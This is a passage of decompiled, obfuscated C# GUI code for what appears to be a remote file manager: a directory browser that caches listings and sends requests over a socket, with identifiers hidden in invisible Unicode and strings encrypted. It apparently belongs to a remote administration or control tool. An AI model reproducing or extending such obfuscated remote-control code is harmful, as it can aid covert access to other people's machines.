		{
			return this.\u000F\u2007;
		}

		// Token: 0x060002C2 RID: 706 RVA: 0x00020300 File Offset: 0x0001E500
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F\u2002);
			if (this.\u000F\u2007 != null)
			{
				this.\u000F\u2007.Click -= value;
			}
			this.\u000F\u2007 = \u0002;
			if (this.\u000F\u2007 != null)
			{
				this.\u000F\u2007.Click += value;
			}
		}

		// Token: 0x060002C3 RID: 707 RVA: 0x00020350 File Offset: 0x0001E550
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001()
		{
			return this.\u0002\u2008;
		}

		// Token: 0x060002C4 RID: 708 RVA: 0x00020364 File Offset: 0x0001E564
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2003);
			if (this.\u0002\u2008 != null)
			{
				this.\u0002\u2008.Click -= value;
			}
			this.\u0002\u2008 = \u0002;
			if (this.\u0002\u2008 != null)
			{
				this.\u0002\u2008.Click += value;
			}
		}

		// Token: 0x060002C5 RID: 709 RVA: 0x000203B4 File Offset: 0x0001E5B4
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001()
		{
			return this.\u0003\u2008;
		}

		// Token: 0x060002C6 RID: 710 RVA: 0x000203C8 File Offset: 0x0001E5C8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003\u2003);
			if (this.\u0003\u2008 != null)
			{
				this.\u0003\u2008.Click -= value;
			}
			this.\u0003\u2008 = \u0002;
			if (this.\u0003\u2008 != null)
			{
				this.\u0003\u2008.Click += value;
			}
		}

		// Token: 0x060002C7 RID: 711 RVA: 0x00020418 File Offset: 0x0001E618
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001()
		{
			return this.\u0005\u2008;
		}

		// Token: 0x060002C8 RID: 712 RVA: 0x0002042C File Offset: 0x0001E62C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005\u2003);
			if (this.\u0005\u2008 != null)
			{
				this.\u0005\u2008.Click -= value;
			}
			this.\u0005\u2008 = \u0002;
			if (this.\u0005\u2008 != null)
			{
				this.\u0005\u2008.Click += value;
			}
		}

		// Token: 0x060002C9 RID: 713 RVA: 0x0002047C File Offset: 0x0001E67C
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002()
		{
			return this.\u0008\u2008;
		}

		// Token: 0x060002CA RID: 714 RVA: 0x00020490 File Offset: 0x0001E690
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008\u2003);
			if (this.\u0008\u2008 != null)
			{
				this.\u0008\u2008.Click -= value;
			}
			this.\u0008\u2008 = \u0002;
			if (this.\u0008\u2008 != null)
			{
				this.\u0008\u2008.Click += value;
			}
		}

		// Token: 0x060002CB RID: 715 RVA: 0x000204E0 File Offset: 0x0001E6E0
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002()
		{
			return this.\u0006\u2008;
		}

		// Token: 0x060002CC RID: 716 RVA: 0x000204F4 File Offset: 0x0001E6F4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0006\u2003);
			if (this.\u0006\u2008 != null)
			{
				this.\u0006\u2008.Click -= value;
			}
			this.\u0006\u2008 = \u0002;
			if (this.\u0006\u2008 != null)
			{
				this.\u0006\u2008.Click += value;
			}
		}

		// Token: 0x060002CD RID: 717 RVA: 0x00020544 File Offset: 0x0001E744
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002()
		{
			return this.\u000E\u2008;
		}

		// Token: 0x060002CE RID: 718 RVA: 0x00020558 File Offset: 0x0001E758
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E\u2003);
			if (this.\u000E\u2008 != null)
			{
				this.\u000E\u2008.Click -= value;
			}
			this.\u000E\u2008 = \u0002;
			if (this.\u000E\u2008 != null)
			{
				this.\u000E\u2008.Click += value;
			}
		}

		// Token: 0x060002CF RID: 719 RVA: 0x000205A8 File Offset: 0x0001E7A8
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002()
		{
			return this.\u000F\u2008;
		}

		// Token: 0x060002D0 RID: 720 RVA: 0x000205BC File Offset: 0x0001E7BC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F\u2003);
			if (this.\u000F\u2008 != null)
			{
				this.\u000F\u2008.Click -= value;
			}
			this.\u000F\u2008 = \u0002;
			if (this.\u000F\u2008 != null)
			{
				this.\u000F\u2008.Click += value;
			}
		}

		// Token: 0x060002D1 RID: 721 RVA: 0x0002060C File Offset: 0x0001E80C
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002()
		{
			return this.\u0002\u2009;
		}

		// Token: 0x060002D2 RID: 722 RVA: 0x00020620 File Offset: 0x0001E820
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2004);
			if (this.\u0002\u2009 != null)
			{
				this.\u0002\u2009.Click -= value;
			}
			this.\u0002\u2009 = \u0002;
			if (this.\u0002\u2009 != null)
			{
				this.\u0002\u2009.Click += value;
			}
		}

		// Token: 0x060002D3 RID: 723 RVA: 0x00020670 File Offset: 0x0001E870
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002()
		{
			return this.\u0003\u2009;
		}

		// Token: 0x060002D4 RID: 724 RVA: 0x00020684 File Offset: 0x0001E884
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003\u2004);
			if (this.\u0003\u2009 != null)
			{
				this.\u0003\u2009.Click -= value;
			}
			this.\u0003\u2009 = \u0002;
			if (this.\u0003\u2009 != null)
			{
				this.\u0003\u2009.Click += value;
			}
		}

		// Token: 0x060002D5 RID: 725 RVA: 0x000206D4 File Offset: 0x0001E8D4
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002()
		{
			return this.\u0005\u2009;
		}

		// Token: 0x060002D6 RID: 726 RVA: 0x000206E8 File Offset: 0x0001E8E8
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005\u2004);
			if (this.\u0005\u2009 != null)
			{
				this.\u0005\u2009.Click -= value;
			}
			this.\u0005\u2009 = \u0002;
			if (this.\u0005\u2009 != null)
			{
				this.\u0005\u2009.Click += value;
			}
		}

		// Token: 0x060002D7 RID: 727 RVA: 0x00020738 File Offset: 0x0001E938
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003()
		{
			return this.\u0008\u2009;
		}

		// Token: 0x060002D8 RID: 728 RVA: 0x0002074C File Offset: 0x0001E94C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0008\u2004);
			if (this.\u0008\u2009 != null)
			{
				this.\u0008\u2009.Click -= value;
			}
			this.\u0008\u2009 = \u0002;
			if (this.\u0008\u2009 != null)
			{
				this.\u0008\u2009.Click += value;
			}
		}

		// Token: 0x060002D9 RID: 729 RVA: 0x0002079C File Offset: 0x0001E99C
		internal virtual ImageList bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005()
		{
			return this.\u0006\u2009;
		}

		// Token: 0x060002DA RID: 730 RVA: 0x000207B0 File Offset: 0x0001E9B0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(ImageList \u0002)
		{
			this.\u0006\u2009 = \u0002;
		}

		// Token: 0x060002DB RID: 731 RVA: 0x000207BC File Offset: 0x0001E9BC
		internal virtual ImageList bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008()
		{
			return this.\u000E\u2009;
		}

		// Token: 0x060002DC RID: 732 RVA: 0x000207D0 File Offset: 0x0001E9D0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(ImageList \u0002)
		{
			this.\u000E\u2009 = \u0002;
		}

		// Token: 0x060002DD RID: 733 RVA: 0x000207DC File Offset: 0x0001E9DC
		internal virtual \u000F\u2000 bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006()
		{
			return this.\u000F\u2009;
		}

		// Token: 0x060002DE RID: 734 RVA: 0x000207F0 File Offset: 0x0001E9F0
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006(\u000F\u2000 \u0002)
		{
			EventHandler value = new EventHandler(this.\u0003\u2005);
			if (this.\u000F\u2009 != null)
			{
				this.\u000F\u2009.SelectedIndexChanged -= value;
			}
			this.\u000F\u2009 = \u0002;
			if (this.\u000F\u2009 != null)
			{
				this.\u000F\u2009.SelectedIndexChanged += value;
			}
		}

		// Token: 0x060002DF RID: 735 RVA: 0x00020840 File Offset: 0x0001EA40
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001()
		{
			return this.\u0002\u200A;
		}

		// Token: 0x060002E0 RID: 736 RVA: 0x00020854 File Offset: 0x0001EA54
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001(ColumnHeader \u0002)
		{
			this.\u0002\u200A = \u0002;
		}

		// Token: 0x060002E1 RID: 737 RVA: 0x00020860 File Offset: 0x0001EA60
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001()
		{
			return this.\u0003\u200A;
		}

		// Token: 0x060002E2 RID: 738 RVA: 0x00020874 File Offset: 0x0001EA74
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001(ColumnHeader \u0002)
		{
			this.\u0003\u200A = \u0002;
		}

		// Token: 0x060002E3 RID: 739 RVA: 0x00020880 File Offset: 0x0001EA80
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002()
		{
			return this.\u0005\u200A;
		}

		// Token: 0x060002E4 RID: 740 RVA: 0x00020894 File Offset: 0x0001EA94
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002(ColumnHeader \u0002)
		{
			this.\u0005\u200A = \u0002;
		}

		// Token: 0x060002E5 RID: 741 RVA: 0x000208A0 File Offset: 0x0001EAA0
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002()
		{
			return this.\u0008\u200A;
		}

		// Token: 0x060002E6 RID: 742 RVA: 0x000208B4 File Offset: 0x0001EAB4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002(ColumnHeader \u0002)
		{
			this.\u0008\u200A = \u0002;
		}

		// Token: 0x060002E7 RID: 743 RVA: 0x000208C0 File Offset: 0x0001EAC0
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002()
		{
			return this.\u0006\u200A;
		}

		// Token: 0x060002E8 RID: 744 RVA: 0x000208D4 File Offset: 0x0001EAD4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002(ColumnHeader \u0002)
		{
			this.\u0006\u200A = \u0002;
		}

		// Token: 0x060002E9 RID: 745 RVA: 0x000208E0 File Offset: 0x0001EAE0
		internal virtual ContextMenuStrip bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F()
		{
			return this.\u000E\u200A;
		}

		// Token: 0x060002EA RID: 746 RVA: 0x000208F4 File Offset: 0x0001EAF4
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F(ContextMenuStrip \u0002)
		{
			this.\u000E\u200A = \u0002;
		}

		// Token: 0x060002EB RID: 747 RVA: 0x00020900 File Offset: 0x0001EB00
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003()
		{
			return this.\u000F\u200A;
		}

		// Token: 0x060002EC RID: 748 RVA: 0x00020914 File Offset: 0x0001EB14
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000E\u2004);
			if (this.\u000F\u200A != null)
			{
				this.\u000F\u200A.Click -= value;
			}
			this.\u000F\u200A = \u0002;
			if (this.\u000F\u200A != null)
			{
				this.\u000F\u200A.Click += value;
			}
		}

		// Token: 0x060002ED RID: 749 RVA: 0x00020964 File Offset: 0x0001EB64
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003()
		{
			return this.\u0002\u200B;
		}

		// Token: 0x060002EE RID: 750 RVA: 0x00020978 File Offset: 0x0001EB78
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u000F\u2004);
			if (this.\u0002\u200B != null)
			{
				this.\u0002\u200B.Click -= value;
			}
			this.\u0002\u200B = \u0002;
			if (this.\u0002\u200B != null)
			{
				this.\u0002\u200B.Click += value;
			}
		}

		// Token: 0x060002EF RID: 751 RVA: 0x000209C8 File Offset: 0x0001EBC8
		internal virtual ToolStripMenuItem bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003()
		{
			return this.\u0003\u200B;
		}

		// Token: 0x060002F0 RID: 752 RVA: 0x000209DC File Offset: 0x0001EBDC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003(ToolStripMenuItem \u0002)
		{
			EventHandler value = new EventHandler(this.\u0002\u2005);
			if (this.\u0003\u200B != null)
			{
				this.\u0003\u200B.Click -= value;
			}
			this.\u0003\u200B = \u0002;
			if (this.\u0003\u200B != null)
			{
				this.\u0003\u200B.Click += value;
			}
		}

		// Token: 0x060002F1 RID: 753 RVA: 0x00020A2C File Offset: 0x0001EC2C
		internal virtual \u000F\u2000 bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E()
		{
			return this.\u0005\u200B;
		}

		// Token: 0x060002F2 RID: 754 RVA: 0x00020A40 File Offset: 0x0001EC40
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(\u000F\u2000 \u0002)
		{
			EventHandler value = new EventHandler(this.\u0005\u2005);
			EventHandler value2 = new EventHandler(this.\u000F\u2000);
			if (this.\u0005\u200B != null)
			{
				this.\u0005\u200B.SelectedIndexChanged -= value;
				this.\u0005\u200B.DoubleClick -= value2;
			}
			this.\u0005\u200B = \u0002;
			if (this.\u0005\u200B != null)
			{
				this.\u0005\u200B.SelectedIndexChanged += value;
				this.\u0005\u200B.DoubleClick += value2;
			}
		}

		// Token: 0x060002F3 RID: 755 RVA: 0x00020AB8 File Offset: 0x0001ECB8
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002()
		{
			return this.\u0008\u200B;
		}

		// Token: 0x060002F4 RID: 756 RVA: 0x00020ACC File Offset: 0x0001ECCC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002(ColumnHeader \u0002)
		{
			this.\u0008\u200B = \u0002;
		}

		// Token: 0x060002F5 RID: 757 RVA: 0x00020AD8 File Offset: 0x0001ECD8
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002()
		{
			return this.\u0006\u200B;
		}

		// Token: 0x060002F6 RID: 758 RVA: 0x00020AEC File Offset: 0x0001ECEC
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002(ColumnHeader \u0002)
		{
			this.\u0006\u200B = \u0002;
		}

		// Token: 0x060002F7 RID: 759 RVA: 0x00020AF8 File Offset: 0x0001ECF8
		internal virtual ColumnHeader bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002()
		{
			return this.\u000E\u200B;
		}

		// Token: 0x060002F8 RID: 760 RVA: 0x00020B0C File Offset: 0x0001ED0C
		[MethodImpl(MethodImplOptions.Synchronized)]
		internal virtual void bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002(ColumnHeader \u0002)
		{
			this.\u000E\u200B = \u0002;
		}

		// Token: 0x060002F9 RID: 761 RVA: 0x00020B18 File Offset: 0x0001ED18
		public void exp(string x, bool Refresh = false)
		{
			string text = x.Replace(global::\u0006\u2001.\u0002(-1829124596), global::\u0006\u2001.\u0002(-1829139395));
			if (!text.EndsWith(global::\u0006\u2001.\u0002(-1829139395)))
			{
				text += global::\u0006\u2001.\u0002(-1829139395);
			}
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text = text;
			ToolStripProgressBar obj = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			checked
			{
				lock (obj)
				{
					this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Image = null;
					this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Visible = false;
					this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().BackColor = Color.IndianRed;
					if (Refresh && this.Cache.Contains(text))
					{
						this.Cache.Remove(text);
					}
					if (this.Cache.Contains(text))
					{
						this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().BackColor = Color.Pink;
						Manager.\u0003 u = (Manager.\u0003)this.Cache[text];
						this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
						this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Maximum = u.\u0005.Count + u.\u0003.Count;
						this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.Clear();
						if (new DirectoryInfo(text).Parent != null)
						{
							ListViewItem listViewItem = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.Add(global::\u0006\u2001.\u0002(-1829129162), global::\u0006\u2001.\u0002(-1829129162), 0);
							listViewItem.SubItems.Add(string.Empty);
							listViewItem.SubItems.Add(global::\u0006\u2001.\u0002(-1829129184));
							listViewItem.ToolTipText = new DirectoryInfo(text).Parent.FullName + global::\u0006\u2001.\u0002(-1829139395);
						}
						try
						{
							foreach (string text2 in u.\u0003)
							{
								ToolStripProgressBar toolStripProgressBar = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
								toolStripProgressBar.Value++;
								ListViewItem listViewItem2 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.Add(text2, new DirectoryInfo(text2).Name, 0);
								listViewItem2.SubItems.Add(string.Empty);
								listViewItem2.SubItems.Add(global::\u0006\u2001.\u0002(-1829129184));
								listViewItem2.ToolTipText = text2;
							}
						}
						finally
						{
							List<string>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
						List<ListViewItem> list = new List<ListViewItem>();
						try
						{
							foreach (string expression in u.\u0005)
							{
								ToolStripProgressBar toolStripProgressBar = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
								toolStripProgressBar.Value++;
								string[] array = Strings.Split(expression, global::\u0006\u2001.\u0002(-1829128238), -1, CompareMethod.Binary);
								FileInfo fileInfo = new FileInfo(array[0]);
								ListViewItem listViewItem3 = new ListViewItem(fileInfo.Name, 1);
								ListViewItem listViewItem4 = listViewItem3;
								listViewItem4.ToolTipText = fileInfo.FullName;
								listViewItem4.SubItems.Add(array[1]);
								listViewItem4.SubItems.Add(array[2]);
								listViewItem4.Name = listViewItem4.ToolTipText;
								if (this.Images.Contains(global::\u0006\u2001.\u0002(-1829138798) + listViewItem4.ToolTipText))
								{
									try
									{
										if (!this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.ContainsKey(listViewItem4.ToolTipText))
										{
											object images = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images;
											Type type = null;
											string memberName = global::\u0006\u2001.\u0002(-1829124605);
											object[] array2 = new object[2];
											object[] array3 = array2;
											int num = 0;
											ListViewItem listViewItem5 = listViewItem4;
											array3[num] = listViewItem5.ToolTipText;
											array2[1] = RuntimeHelpers.GetObjectValue(this.Images[listViewItem4.ToolTipText]);
											object[] array4 = array2;
											object[] arguments = array4;
											string[] argumentNames = null;
											Type[] typeArguments = null;
											bool[] array5 = new bool[]
											{
												true,
												false
											};
											NewLateBinding.LateCall(images, type, memberName, arguments, argumentNames, typeArguments, array5, true);
											if (array5[0])
											{
												listViewItem5.ToolTipText = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
											}
										}
									}
									catch (Exception ex)
									{
									}
									listViewItem4.ImageKey = listViewItem4.ToolTipText;
								}
								else if (fileInfo.Extension.Length > 0)
								{
									if (!this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.ContainsKey(fileInfo.Extension))
									{
										File.Create(Application.StartupPath + global::\u0006\u2001.\u0002(-1829129188) + fileInfo.Extension).Close();
										this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + global::\u0006\u2001.\u0002(-1829129188) + fileInfo.Extension));
										File.Delete(Application.StartupPath + global::\u0006\u2001.\u0002(-1829129188) + fileInfo.Extension);
										listViewItem4.ImageKey = fileInfo.Extension;
									}
									else
									{
										listViewItem4.ImageKey = fileInfo.Extension;
									}
								}
								listViewItem4 = null;
								list.Add(listViewItem3);
								if (list.Count > 20)
								{
									this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.AddRange(list.ToArray());
									list.Clear();
								}
							}
						}
						finally
						{
							List<string>.Enumerator enumerator2;
							((IDisposable)enumerator2).Dispose();
						}
						if (list.Count > 0)
						{
							this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.AddRange(list.ToArray());
							list.Clear();
						}
						this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							global::\u0006\u2001.\u0002(-1829128217),
							global::\u000E\u2000.\u000E,
							global::\u0006\u2001.\u0002(-1829129203),
							global::\u000E\u2000.\u000E,
							global::\u0006\u2001.\u0002(-1829138798),
							global::\u000E\u2000.\u000E,
							global::\u000E.\u0002(ref text)
						}));
					}
				}
			}
		}

		// Token: 0x060002FA RID: 762 RVA: 0x00021154 File Offset: 0x0001F354
		private void \u0002(object \u0002, FormClosingEventArgs \u0003)
		{
			try
			{
				this.Images.Clear();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.Cache.Clear();
			}
			catch (Exception ex2)
			{
			}
			if (this.sk != null && this.sk.CN)
			{
				this.sk.Send(string.Concat(new string[]
				{
					global::\u0006\u2001.\u0002(-1829128217),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829128569),
					global::\u000E\u2000.\u000E,
					global::\u0006\u2001.\u0002(-1829138768)
				}));
			}
		}

		// Token: 0x060002FB RID: 763 RVA: 0x0002122C File Offset: 0x0001F42C
		private void \u0002(object \u0002, EventArgs \u0003)
		{
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Tag = null;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Tag = null;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().Dock = DockStyle.Fill;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Nodes.Add(global::\u0006\u2001.\u0002(-1829124583), global::\u0006\u2001.\u0002(-1829124583));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Nodes.Add(global::\u0006\u2001.\u0002(-1829124511), global::\u0006\u2001.\u0002(-1829124511));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Nodes.Add(global::\u0006\u2001.\u0002(-1829124535), global::\u0006\u2001.\u0002(-1829124535));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Nodes.Add(global::\u0006\u2001.\u0002(-1829124528), global::\u0006\u2001.\u0002(-1829124528));
